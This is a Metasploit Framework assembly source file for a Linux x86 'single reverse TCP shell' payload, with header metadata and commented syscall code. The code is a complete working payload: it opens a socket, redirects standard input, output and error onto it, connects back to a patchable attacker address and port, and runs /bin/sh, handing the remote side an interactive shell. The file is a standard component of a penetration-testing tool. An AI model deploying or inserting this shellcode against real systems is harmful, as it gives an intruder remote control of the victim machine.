;;
; 
;        Name: single_reverse_tcp_shell
;     Version: $Revision: 1512 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Single reverse TCP shell.
;
; Meta-Information:
;
; meta-shortname=Linux Reverse TCP Shell
; meta-description=Connect back to the attacker and spawn a shell
; meta-authors=skape <mmiller [at] hick.org>
; meta-os=linux
; meta-arch=ia32
; meta-category=single
; meta-connection-type=reverse
; meta-name=reverse_tcp_shell
; meta-basemod=Msf::PayloadComponent::ReverseConnection
; meta-offset-lhost=0x1a
; meta-offset-lport=0x20
;;
BITS   32
GLOBAL _start

_start:
	xor  ebx, ebx
	mul  ebx

socket:
	push ebx              ; protocol = 0 = first that matches this type and domain, i.e. tcp
	inc  ebx              ; 1 = SYS_SOCKET
	push ebx              ; type     = 1 = SOCK_STREAM
	push byte 0x2         ; domain   = 2 = AF_INET
	mov  ecx, esp         ; socketcall args
	mov  al, 0x66
	int  0x80
	xchg eax, ebx

; int dup2(int oldfd, int newfd);
dup:
	pop  ecx              ; oldfd = 2, aka stderr
	; newfd is in ebx, set above, and doesn't change until we're ready to call
	; connect(2)
dup_loop:
	mov  al, 0x3f         ; __NR_dup2
	int  0x80
	dec  ecx
	jns  dup_loop

; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
connect:
	push dword 0x0100007f ; addr->sin_addr = 127.0.0.1
	push 0xbfbf0002       ; addr->sin_port = 49087
	                      ; addr->sin_family = 2 = AF_INET
	mov  ecx, esp         ; ecx = addr
	mov  al, 0x66         ; __NR_socketcall
	push eax              ; addrlen
	push ecx              ; addr
	push ebx              ; sockfd
	mov  bl, 0x3          ; 3 = SYS_CONNECT
	mov  ecx, esp         ; socketcall args
	int  0x80

; int execve(const char *filename, char *const argv[], char *const envp[]);
execve:
	push edx              ; NULL terminator for "/bin//sh"
	push dword 0x68732f2f
	push dword 0x6e69622f
	mov  ebx, esp         ; filename
	push edx              ; NULL terminator for argv
	push ebx              ; pointer to "/bin//sh"
	mov  ecx, esp         ; argv = pointer to pointer to "/bin//sh"
	mov  al, 0x0b         ; __NR_execve
	int  0x80

